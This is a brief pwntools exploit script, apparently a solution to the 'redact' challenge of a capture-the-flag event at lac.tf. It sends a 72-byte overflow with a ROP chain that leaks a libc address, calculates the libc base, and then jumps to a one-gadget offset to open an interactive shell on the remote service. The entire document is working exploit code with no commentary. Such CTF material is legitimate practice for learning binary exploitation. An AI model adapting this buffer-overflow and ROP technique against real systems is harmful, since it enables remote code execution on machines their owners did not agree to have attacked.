from pwn import *
context.terminal = 'kitty'

#r = process(["./redact"])
r = remote("lac.tf", 31281)
#gdb.attach(r, '')

OFFSET = 72
r.sendline(b"a")
POPRSIR15 = 0x0000000000401779
POPRDI = 0x000000000040177b
r.recvuntil(b"place")
r.sendline(b"a"*OFFSET + p64(POPRSIR15) + p64(0x404050) + p64(0) + p64(POPRDI) + p64(0x4040c0) + p64(0x4010c0) + p64(0x401202))
r.sendline(b"0")
r.recvuntil(b"redact: a\n")
leak = r.recv(6)
print("leak", leak)
leak = u64(leak + b"\x00\x00")
#leak -= 0x43420
leak -= 0x000000000003b9f0
print("base", hex(leak))
#r.sendline(b"\x00"*OFFSET+p64(0x0000000000401016)+p64(leak+0x10a308)+p64(0)*15)
r.recvuntil(b"place")
r.sendline(b"\x00"*OFFSET+p64(0x0000000000401016)+p64(0x0000000000401774) + p64(0)*4 + p64(leak+0xc961a))
r.recvuntil(b"index")
r.sendline(b"0")

r.interactive()
